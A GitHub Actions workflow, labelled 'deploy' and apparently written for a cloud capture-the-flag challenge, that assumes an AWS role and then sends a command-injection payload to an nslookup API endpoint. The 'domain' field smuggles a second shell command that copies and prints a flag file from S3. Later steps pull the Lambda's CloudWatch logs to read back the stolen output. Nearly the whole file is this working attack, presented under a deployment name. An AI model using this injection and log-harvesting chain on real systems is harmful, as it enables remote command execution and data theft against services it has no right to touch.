name: deploy
on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Fire injection payload first
        run: |
          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}'

      - name: Wait for execution and log propagation
        run: sleep 10

      - name: Test logs:FilterLogEvents
        continue-on-error: true
        run: |
          echo "===== filter-log-events ====="
          START=$(date -d '10 minutes ago' +%s000)
          aws logs filter-log-events \
            --log-group-name /aws/lambda/nslookupv2 \
            --start-time "$START" \
            --query 'events[*].message' \
            --output text

      - name: Test logs:DescribeLogStreams
        continue-on-error: true
        run: |
          echo "===== describe-log-streams ====="
          aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 3

      - name: Test logs:GetLogEvents from latest stream
        continue-on-error: true
        run: |
          echo "===== get-log-events ====="
          STREAM=$(aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 1 \
            --query 'logStreams[0].logStreamName' --output text 2>/dev/null)
          echo "Stream: $STREAM"
          aws logs get-log-events \
            --log-group-name /aws/lambda/nslookupv2 \
            --log-stream-name "$STREAM" \
            --query 'events[*].message' \
            --output text

      - name: Test logs:DescribeLogGroups
        continue-on-error: true
        run: |
          echo "===== describe-log-groups ====="
          aws logs describe-log-groups \
            --log-group-name-prefix /aws/lambda/nslookupv2
